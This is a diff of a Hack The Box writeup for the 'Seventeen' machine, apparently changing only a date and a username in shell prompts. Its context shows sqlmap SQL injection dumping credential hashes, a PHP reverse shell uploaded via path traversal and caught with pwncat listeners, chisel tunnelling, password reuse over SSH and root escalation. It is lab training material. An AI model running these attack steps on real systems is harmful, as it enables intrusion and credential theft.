@@ -4,7 +4,7 @@ summary: "A hard rated box, serveral web vulnerabilities and privilege escation 
 tags: ["htb", "writeup", "hard"]
 #externalUrl: ""
 showSummary: true
-date: 2023-01-19
+date: 2023-01-20
 draft: false
 ---
 # Seventeen
@@ -14,7 +14,7 @@ draft: false
 ```nmap``` scans three open ports ```ssh(22)```,```http(80)``` and ```http_alt(8000)```
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sudo nmap -A -T4 -sC -sV -p- 10.10.11.165
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 10:56 CEST
 Nmap scan report for seventeen.htb (10.10.11.165)
@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 34.83 seconds
 
 Lets add ```seventeen.htb``` to our ```/etc/hosts``` and start subdomain enumeration:
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       kali
@@ -75,7 +75,7 @@ ff02::2 ip6-allrouters
 With ```fuff``` we find ```exam.seventeen.htb```, I've also added it the ```/etc/hosts``` file on my machine.
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.seventeen.htb" -u http://seventeen.htb/ -fs 20689
 
 
@@ -111,7 +111,7 @@ https://www.exploit-db.com/exploits/50725
 ### SQLMAP
 With the help of the exploit, lets dump some databases:
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" --dbs
         ___
        __H__                                                                                                                                                
@@ -156,14 +156,14 @@ available databases [4]:
 [*] information_schema
 [*] roundcubedb
 
-[11:07:54] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'
+[11:07:54] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/exam.seventeen.htb'
 
 [*] ending @ 11:07:54 /2022-07-20/
 ```
 
 Dump tables:
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -D db_sfms --tables                                                                         1 ⨯
         ___
        __H__                                                                                                                                                
@@ -209,13 +209,13 @@ Database: db_sfms
 | student |
 +---------+
 
-[11:34:04] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'
+[11:34:04] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/exam.seventeen.htb'
 
 [*] ending @ 11:34:04 /2022-07-20/
 ```
 Dump columns:
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -D db_sfms -T user --columns                                                                1 ⨯
         ___
        __H__                                                                                                                                                
@@ -275,13 +275,13 @@ Table: user
 | username  | varchar(20) |
 +-----------+-------------+
 
-[11:34:50] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'
+[11:34:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/exam.seventeen.htb'
 
 [*] ending @ 11:34:50 /2022-07-20/
 ```
 Dump ```users``` table:
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -batch -D db_sfms -T user -C username
         ___
        __H__                                                                                                                                                
@@ -312,12 +312,12 @@ Parameter: id (GET)
 web server operating system: Linux Debian 10 (buster)
 web application technology: PHP, Apache 2.4.38, PHP 7.2.34
 back-end DBMS: MySQL >= 5.0.12
-[11:37:06] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'
+[11:37:06] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/exam.seventeen.htb'
 
 [*] ending @ 11:37:06 /2022-07-20/
 
                                                                                                                                                             
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -batch -D db_sfms -T user --dump     
         ___
        __H__                                                                                                                                                
@@ -403,15 +403,15 @@ Table: user
 | 4       | Regular       | Smith         | 112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992         | Steven        |
 +---------+---------------+---------------+----------------------------------+------------------+---------------+
 
-[11:38:40] [INFO] table 'db_sfms.`user`' dumped to CSV file '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/user.csv'
-[11:38:40] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'
+[11:38:40] [INFO] table 'db_sfms.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/user.csv'
+[11:38:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/exam.seventeen.htb'
 
 [*] ending @ 11:38:40 /2022-07-20/
 ```
 
 Dump ```students``` Table:
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -batch -D db_sfms -T student --dump        
         ___
        __H__                                                                                                                                                
@@ -509,8 +509,8 @@ Table: student
 | 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
 +---------+----+--------+---------+----------+----------------------------------------------------+-----------+
 
-[11:42:32] [INFO] table 'db_sfms.student' dumped to CSV file '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/student.csv'
-[11:42:32] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'
+[11:42:32] [INFO] table 'db_sfms.student' dumped to CSV file '/home/kali/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/student.csv'
+[11:42:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/exam.seventeen.htb'
 
 [*] ending @ 11:42:32 /2022-07-20/
 ```
@@ -526,7 +526,7 @@ So my conclusion is that the student credentials do not belong to the Exam Manag
 
 ### Dirbusting
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -u http://seventeen.htb/  -e -s 200  
  
 ===============================================================
@@ -556,7 +556,7 @@ http://seventeen.htb/server-status        (Status: 403) [Size: 278]
 ===============================================================
 ```
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -u http://seventeen.htb:8000/  
 ===============================================================
 Gobuster v3.1.0
@@ -601,7 +601,7 @@ Okay so the ```credentials``` we've got are from the ```Student File Management 
 By dumping the storage table, we can see that there exists a ```PDF``` we might need to get a hold of.
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -batch -D db_sfms -T storage --dump
         ___
        __H__                                                                                                                                                
@@ -711,7 +711,7 @@ https://mastermailer.seventeen.htb/
 
 Lets add the subdomain to our hosts:
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ cat /etc/hosts                                                                                                      
 127.0.0.1       localhost
 127.0.1.1       kali
@@ -732,15 +732,15 @@ Lets go back to the ```File Management Application```, there is a upload functio
 
 I've created a ```php reverse shell``` and lets start some testing:
 ```
-┌──(luca㉿kali)-[~/ctf/htb/seventeen/serve]
+┌──(kali㉿kali)-[~/ctf/htb/seventeen/serve]
 └─$ cp /usr/share/webshells/php/php-reverse-shell.php .
                                                                                                                                                             
-┌──(luca㉿kali)-[~/ctf/htb/seventeen/serve]
+┌──(kali㉿kali)-[~/ctf/htb/seventeen/serve]
 └─$ mv php-reverse-shell.php shell.php
 ```
 First ```dirbust``` the application: 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -u http://seventeen.htb:8000/oldmanagement/  -e -s 200
 
 ===============================================================
@@ -812,7 +812,7 @@ Browsing to http://seventeen.htb:8000/oldmanagement/files/31234/ confirms that t
 Is our testfile in there?
 **It is!**
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ curl http://seventeen.htb:8000/oldmanagement/files/31234/test.txt  
 foobar
 ```
@@ -1045,10 +1045,10 @@ Content-Disposition: form-data; name="save"
 The file exists in the directory but execution/access is forbidden.
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ curl http://seventeen.htb:8000/oldmanagement/files/31234/shell.php
 <h1>Forbidden</h1>                                                                                                                                                            
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ curl http://seventeen.htb:8000/oldmanagement/files/31234/notmy_shell.php
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -1070,7 +1070,7 @@ Content-Disposition: form-data; name="file"; filename="../shell.php"
 Did not work:
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ curl http://seventeen.htb:8000/oldmanagement/files/shell.php 
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -1093,7 +1093,7 @@ Content-Disposition: form-data; name="stud_no"
 
 Yea, the path traversal worked! Lets trigger the php file.
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ curl http://seventeen.htb:8000/oldmanagement/files/shell1.php
 WARNING: Failed to daemonise.  This is quite common and not fatal.
 <br />
@@ -1105,8 +1105,8 @@ Connection refused (111)
 
 Catch the shell:
 ```
-┌──(luca㉿kali)-[~]
-└─$ /home/luca/.local/bin/pwncat-cs -lp 4444
+┌──(kali㉿kali)-[~]
+└─$ /home/kali/.local/bin/pwncat-cs -lp 4444
 [13:46:50] Welcome to pwncat 🐈!                                                                                                             __main__.py:164
 [13:46:52] received connection from 10.10.11.165:51870                                                                                            bind.py:84
 [13:46:52] 0.0.0.0:4444: upgrading from /bin/dash to /bin/bash                                                                                manager.py:957
@@ -1170,7 +1170,7 @@ Altough we are within a containter ```/etc/passwd``` reveals the user ```mark```
 Lets test the credentials.
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ ssh mark@seventeen.htb               
 The authenticity of host 'seventeen.htb (10.10.11.165)' can't be established.
 ED25519 key fingerprint is SHA256:g48H/Ajb4W/Ct4cyRPBjSfQksMfb0WSo3zZYJlr9jMk.
@@ -1316,7 +1316,7 @@ mark@seventeen:/var/mail$ curl localhost:4873
 
 Chisel Server:
 ```
-┌──(luca㉿kali)-[~/ctf/htb/seventeen/serve]
+┌──(kali㉿kali)-[~/ctf/htb/seventeen/serve]
 └─$ ./chisel server -p 8083 --reverse
 2022/07/20 17:14:52 server: Reverse tunnelling enabled
 2022/07/20 17:14:52 server: Fingerprint aBq4cfxSuWzyr0gHl7cvrbptBXs5r4bLruCbCnEv/88=
@@ -1413,7 +1413,7 @@ With the portforward of ```Verdaggio``` still running, I've tested around with t
 
 Testing any directory/endpoint in the URL gives back a ```json``` output like this:
 ```
-┌──(luca㉿kali)-[~/ctf/htb/seventeen/loot]
+┌──(kali㉿kali)-[~/ctf/htb/seventeen/loot]
 └─$ proxychains4 -q curl http://localhost:4873/test
 {
   "error": "no such package available"
@@ -1433,7 +1433,7 @@ drwxr-x---  2 root root 4096 May 10 17:44 db-logger
 
 Lets Curl for that specific package.
 ```
-┌──(luca㉿kali)-[~/ctf/htb/seventeen/loot]
+┌──(kali㉿kali)-[~/ctf/htb/seventeen/loot]
 └─$ proxychains4 -q curl http://localhost:4873/db-logger
 {
   "name": "db-logger",
@@ -1488,7 +1488,7 @@ Lets Curl for that specific package.
 Oh yeah we can download the package from http://localhost:4873/db-logger/-/db-logger-1.0.1.tgz 
 Let's examine it.
 ```
-┌──(luca㉿kali)-[~/ctf/htb/seventeen/loot]
+┌──(kali㉿kali)-[~/ctf/htb/seventeen/loot]
 └─$ proxychains4 -q wget http://localhost:4873/db-logger/-/db-logger-1.0.1.tgz                                                                          4 ⨯
 --2022-07-21 19:04:01--  http://localhost:4873/db-logger/-/db-logger-1.0.1.tgz
 Resolving localhost (localhost)... ::1, 127.0.0.1
@@ -1503,13 +1503,13 @@ db-logger-1.0.1.tgz                    100%[====================================
 2022-07-21 19:04:01 (40.3 MB/s) - ‘db-logger-1.0.1.tgz’ saved [596/596]
 
                                                                                                                                                             
-┌──(luca㉿kali)-[~/ctf/htb/seventeen/loot]
+┌──(kali㉿kali)-[~/ctf/htb/seventeen/loot]
 └─$ tar -xf db-logger-1.0.1.tgz  
 ```
 
 New DB Creds within the js file
 ```
-┌──(luca㉿kali)-[~/…/htb/seventeen/loot/package]
+┌──(kali㉿kali)-[~/…/htb/seventeen/loot/package]
 └─$ cat logger.js 
 var mysql = require('mysql');
 
@@ -1543,7 +1543,7 @@ Lets check for password reuse on the ```kavi``` account
 
 Success!
 ```
-┌──(luca㉿kali)-[~/…/htb/seventeen/loot/package]
+┌──(kali㉿kali)-[~/…/htb/seventeen/loot/package]
 └─$ ssh kavi@seventeen.htb                                                                                                                            255 ⨯
 kavi@seventeen.htb's password: 
 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-177-generic x86_64)
@@ -2207,8 +2207,8 @@ kavi@seventeen:/opt/app$ sudo /opt/app/startup.sh
 ```
 Catch the shell and profit!
 ```
-┌──(luca㉿kali)-[~]
-└─$ /home/luca/.local/bin/pwncat-cs -lp 4242
+┌──(kali㉿kali)-[~]
+└─$ /home/kali/.local/bin/pwncat-cs -lp 4242
 [00:05:49] Welcome to pwncat 🐈!                                                                                                             __main__.py:164
 [00:15:02] received connection from 10.10.11.165:56244                                                                                            bind.py:84
 [00:15:03] 0.0.0.0:4242: upgrading from /bin/dash to /bin/bash                                                                                manager.py:957
